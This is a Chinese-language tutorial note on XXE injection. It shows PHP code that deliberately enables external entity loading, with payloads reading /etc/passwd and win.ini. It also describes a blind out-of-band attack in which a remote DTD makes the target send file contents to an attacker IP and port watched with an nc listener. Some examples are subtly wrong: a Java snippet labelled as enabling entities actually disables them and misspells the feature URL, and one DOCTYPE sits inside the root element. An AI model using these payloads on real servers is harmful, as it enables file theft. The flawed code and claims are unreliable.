# XXE(XML外部实体注入)

## XXE漏洞产生原因

```
应用程序在解析xml输入时，没有禁止外部xml实体的加载，导致攻击者可以构造一个恶意的xml，造成任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害
```

## XML基本格式

```
<!--
需要注意的是:
    必须要有根元素 这里book为根元素
    严格区分大小写 
    标签必须要能够闭合
    标签中的属性的值必须使用双引号
-->

<?xml version="1.0" encoding="utf-8" ?>
<book>
    <name>斗破苍穹</name>
    <type>玄幻</type>
    <color>黑色</color>
    <price>15.8</price>
</book>
```

## xml实体格式

```
(外部实体定义需要添加上system关键字，如果不加该关键字，则为引用内部实体或者公共实体)
```

#### 1、引用内部实体

```
<!DOCTYPE 根元素名称 [元素申明]>
```

#### 2、引用外部实体

```
基本语法
	<!DOCTYPE 根元素名称 SYSTEM "dtd文件路径">

<?xml version="1.0" encoding="UTF-8" ?>
<root>
	<!DOCTYPE book system "">
    <!DOCTYPE book system "file:///etc/passwd">
    <value>&book;</value>
</root>
```

#### 3、引用公共实体

```
示例:
	<!DOCTYPE 根元素名称 PUBLIC "DTD名称" "公共的dtd URI">
```

## 示例代码

```
<?php

//开启xml外部实体引用
libxml_disable_entity_loader (false);
//通过put伪协议接收xml字符串(也可以通过其他方式提交数据)
$xmlfile = file_get_contents('php://input');
//创建一个DOM对象
$dom = new DOMDocument();
//从一个字符串中加载一个xml,成功时返回 TRUE， 或者在失败时返回 FALSE
$dom->loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
//将一个字符串解释为xml对象并返回
$creds = simplexml_import_dom($dom);
```

## 关键函数

## libxml_disable_entity_loader($disable)

```
php中解析xml函数采用的是：
	libxml_disable_entity_loader() 函数，该函数在传入参数$disable为false时表示开启xml外部实体引用，在$disable为true时表示关闭xml外部实体引用，在该函数版本>= 2.9.0中默认禁用解析外部xml实体内容
```

#### java中开启xml外部实体

```
public static void main(String args) throws ParserConfigurationException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setExpandEntityReferences(false);
   dbf.setFeature("http://apache.org/xm1/features/disallow-doctype-decl",true);
}
```

#### 问题一:XXE加载到的文件有特殊字符如何处理?

```
如果是加载到特殊字符导致DOMDOCUMENT::loadXML() 报错,可以使用伪协议进行绕过
推荐使用?xml=php://filter/read=convet.base64-encode/resource=外部实体路径
然后将获得的结果进行base64解码即可
```

#### 问题二:XXE加载到的文件无回显怎么处理

```
虽然引入外部实体没有回显，但是服务器是能够执行该操作的的，我们可以在引用的外部实体中再添加一行数据(<!DOCTYPE % dtd SYSTEM "">)让该服务器远程加载我们可控制的公网服务器(vps)的dtd文件，该公网服务器的dtd文件中配置的内容(ip和端口为ngrok或者frp对应的ip:端口)是让目标服务器将读取的数据发送到我们监听的内网服务器(这里需要进行内网穿透 我一般使用的是ngrok或者frp)，这里还需要内网的服务器对应的端口开启监听 nc -lvp 对应端口
发送的数据包
<?xml version="1.0"?>
    <!DOCTYPE ANY [
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/Windows/win.ini">
        <!ENTITY % dtd SYSTEM "http://192.168.1.40/xxe_file.dtd">
    %dtd;
    %send;
    ]>
可控制的公网服务器dtd文件内容
<!ENTITY % all
        "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.166:1122/?%file;'>"
        >
        %all;
```

